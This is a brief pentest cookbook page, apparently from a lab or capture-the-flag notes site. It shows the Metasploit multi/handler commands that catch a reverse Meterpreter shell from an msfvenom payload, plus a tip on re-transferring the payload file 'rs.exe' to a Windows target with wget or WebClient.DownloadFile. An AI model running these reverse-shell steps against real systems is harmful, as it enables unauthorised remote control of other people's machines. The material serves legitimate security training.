---
layout: default
title: Meterpreter
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## Manual Meterpreter shell
Create a payload using `msfvenom`. Start `msfconsole` and load multi-handler:
```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set LHOST tun0
msf5 exploit(multi/handler) > set LPORT 4444
msf5 exploit(multi/handler) > show options
msf5 exploit(multi/handler) > run
```

If you get the following error, it's possible the file has not transfered properly. Transfer the file using `wget`, samba or `WebClient.DownloadFile` instead:
```
Program 'rs.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
```